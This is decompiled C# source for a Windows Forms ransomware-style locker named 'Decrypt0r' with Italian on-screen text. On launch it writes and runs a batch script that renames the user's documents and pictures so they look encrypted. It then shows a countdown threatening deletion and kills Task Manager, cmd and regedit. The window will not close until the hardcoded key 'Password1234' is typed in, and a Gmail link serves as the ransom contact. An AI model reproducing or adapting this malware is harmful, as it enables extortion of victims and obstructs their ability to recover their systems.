using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace WindowsFormsApp1;

public class Decrypt0r : Form
{
	private string User = Environment.UserName.ToString();

	private int i = 5;

	private IContainer components = null;

	private RichTextBox richTextBox1;

	private Label label1;

	private Label label2;

	private PictureBox pictureBox1;

	private Label label3;

	private TextBox textBox1;

	private Button button1;

	private Label label4;

	private RichTextBox richTextBox2;

	private Label label5;

	private RichTextBox richTextBox3;

	private PictureBox pictureBox2;

	private Label label6;

	private Label label7;

	private TextBox textBox2;

	private Button button2;

	private Label label10;

	private Label label11;

	private Timer timer1;

	private LinkLabel linkLabel1;

	private Timer Disable;

	private Label label8;

	public Decrypt0r()
	{
		InitializeComponent();
		Thread.Sleep(1000);
		Encrypt();
		DateTime startTime = DateTime.Now;
		timer1.add_Tick((EventHandler)delegate
		{
			((Control)label6).set_Text((TimeSpan.FromMinutes(120.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		timer1.set_Enabled(true);
	}

	public void Encrypt()
	{
		StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + User + "\\Desktop\\Encrypt.bat");
		streamWriter.WriteLine("@echo off");
		streamWriter.WriteLine("cd C:\\Users\\" + User + "\\Desktop\\");
		streamWriter.WriteLine("ren *.txt *.Cryptxt");
		streamWriter.WriteLine("ren *.docx *.Cryptword");
		streamWriter.WriteLine("ren *.pdf *.Cryptpdf");
		streamWriter.WriteLine("cd C:\\Users\\" + User + "\\Documents\\");
		streamWriter.WriteLine("ren *.txt *.Cryptxt");
		streamWriter.WriteLine("ren *.docx *.Cryptword");
		streamWriter.WriteLine("ren *.pdf *.Cryptpdf");
		streamWriter.WriteLine("cd C:\\Users\\" + User + "\\Pictures\\Saved Pictures\\");
		streamWriter.WriteLine("ren *.png *.Cryptpng");
		streamWriter.WriteLine("ren *.jpeg *.Cryptjpeg");
		streamWriter.WriteLine("ren *.jpg *.Cryptjpg");
		streamWriter.Close();
		Process.Start("C:\\Users\\" + User + "\\Desktop\\Encrypt.bat");
		Thread.Sleep(500);
		File.Delete("C:\\Users\\" + User + "\\Desktop\\Encrypt.bat");
	}

	private void Decrypt0r_Load(object sender, EventArgs e)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox2).get_Text() == "Password1234")
		{
			StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + User + "\\Desktop\\Decrypt.bat");
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine("cd C:\\Users\\" + User + "\\Desktop\\");
			streamWriter.WriteLine("ren *.Cryptxt *.txt");
			streamWriter.WriteLine("ren *.Cryptword *.docx");
			streamWriter.WriteLine("ren *.Cryptpdf *.pdf");
			streamWriter.WriteLine("cd C:\\Users\\" + User + "\\Documents\\");
			streamWriter.WriteLine("ren *.Cryptxt *.txt");
			streamWriter.WriteLine("ren *.Cryptword *.docx");
			streamWriter.WriteLine("ren *.Cryptpdf *.pdf");
			streamWriter.WriteLine("cd C:\\Users\\" + User + "\\Pictures\\Saved Pictures\\");
			streamWriter.WriteLine("ren *.Cryptpng *.png");
			streamWriter.WriteLine("ren *.Cryptjpeg *.jpeg");
			streamWriter.WriteLine("ren *.Cryptjpg *.jpg");
			streamWriter.Close();
			Process.Start("C:\\Users\\" + User + "\\Desktop\\Decrypt.bat");
			Thread.Sleep(2000);
			File.Delete("C:\\Users\\" + User + "\\Desktop\\Decrypt.bat");
			Thread.Sleep(750);
			((Form)this).Close();
		}
		else
		{
			MessageBox.Show("Wrong Key", "ERROR", (MessageBoxButtons)4, (MessageBoxIcon)16);
			((TextBoxBase)textBox2).Clear();
			i--;
			((Control)label11).set_Text(i.ToString());
			if (i == 0)
			{
				((Control)textBox2).set_Enabled(false);
			}
		}
	}

	private void Decrypt0r_MaximizedBoundsChanged(object sender, EventArgs e)
	{
	}

	private void Decrypt0r_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
		if (((Control)textBox2).get_Text() == "Password1234")
		{
			((CancelEventArgs)(object)e).Cancel = false;
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("taskmgr");
		if (processesByName.Length != 0)
		{
			processesByName[0].Kill();
			MessageBox.Show("Non Puoi Avviare il Task Manager", "ERROR", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		Process[] processesByName2 = Process.GetProcessesByName("cmd");
		if (processesByName2.Length != 0)
		{
			processesByName2[0].Kill();
			MessageBox.Show("Non Puoi Avviare il CMD", "ERROR", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		Process[] processesByName3 = Process.GetProcessesByName("regedit");
		if (processesByName3.Length != 0)
		{
			processesByName3[0].Kill();
			MessageBox.Show("Non Puoi Avviare l'editor del registro di sistema", "ERROR", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://mail.google.com/mail/u/0/#inbox?compose=GTvVlcRzDDDhcNnmCmXZnHTVqMPLGFvWhfvFLrwWTvtqbkRLDPrGstXDQvfFqksZpfhTfsNtZMmQb");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Expected O, but got Unknown
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Expected O, but got Unknown
		//IL_0271: Unknown result type (might be due to invalid IL or missing references)
		//IL_027b: Expected O, but got Unknown
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Expected O, but got Unknown
		//IL_0441: Unknown result type (might be due to invalid IL or missing references)
		//IL_044b: Expected O, but got Unknown
		//IL_053a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0544: Expected O, but got Unknown
		//IL_0570: Unknown result type (might be due to invalid IL or missing references)
		//IL_057a: Expected O, but got Unknown
		//IL_06c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_06cf: Expected O, but got Unknown
		//IL_06ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0709: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Decrypt0r));
		richTextBox3 = new RichTextBox();
		pictureBox2 = new PictureBox();
		label6 = new Label();
		label7 = new Label();
		textBox2 = new TextBox();
		button2 = new Button();
		label10 = new Label();
		label11 = new Label();
		timer1 = new Timer(components);
		linkLabel1 = new LinkLabel();
		Disable = new Timer(components);
		label8 = new Label();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)richTextBox3).set_BackColor(SystemColors.Control);
		((Control)richTextBox3).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox3).set_Location(new Point(305, 12));
		((Control)richTextBox3).set_Name("richTextBox3");
		((TextBoxBase)richTextBox3).set_ReadOnly(true);
		((Control)richTextBox3).set_Size(new Size(462, 310));
		((Control)richTextBox3).set_TabIndex(0);
		((Control)richTextBox3).set_Text(componentResourceManager.GetString("richTextBox3.Text"));
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(67, 12));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(139, 121));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox2.set_TabIndex(1);
		pictureBox2.set_TabStop(false);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_Location(new Point(78, 213));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(91, 33));
		((Control)label6).set_TabIndex(2);
		((Control)label6).set_Text("Timer");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_Location(new Point(28, 173));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(237, 18));
		((Control)label7).set_TabIndex(3);
		((Control)label7).set_Text("I tuoi files saranno eliminati in:");
		((Control)textBox2).set_Location(new Point(347, 358));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(420, 20));
		((Control)textBox2).set_TabIndex(4);
		((Control)button2).set_Location(new Point(514, 399));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(83, 26));
		((Control)button2).set_TabIndex(7);
		((Control)button2).set_Text("Decrypt");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font("Arial", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_Location(new Point(247, 358));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(78, 18));
		((Control)label10).set_TabIndex(8);
		((Control)label10).set_Text("Tentativi: ");
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_Font(new Font("Arial", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_Location(new Point(319, 358));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(16, 18));
		((Control)label11).set_TabIndex(9);
		((Control)label11).set_Text("5");
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_Location(new Point(28, 335));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(74, 13));
		((Control)linkLabel1).set_TabIndex(10);
		linkLabel1.set_TabStop(true);
		((Control)linkLabel1).set_Text("Link Richiesta");
		linkLabel1.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked));
		Disable.set_Interval(10);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Arial", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_Location(new Point(347, 339));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(73, 16));
		((Control)label8).set_TabIndex(11);
		((Control)label8).set_Text("Password:");
		((Form)this).set_AcceptButton((IButtonControl)(object)button2);
		((Control)this).set_BackColor(Color.Red);
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		((Form)this).set_ClientSize(new Size(779, 459));
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)linkLabel1);
		((Control)this).get_Controls().Add((Control)(object)label11);
		((Control)this).get_Controls().Add((Control)(object)label10);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)richTextBox3);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Decrypt0r");
		((Control)this).set_Text("Decrypt0r");
		((Form)this).add_MaximizedBoundsChanged((EventHandler)Decrypt0r_MaximizedBoundsChanged);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Decrypt0r_FormClosing));
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
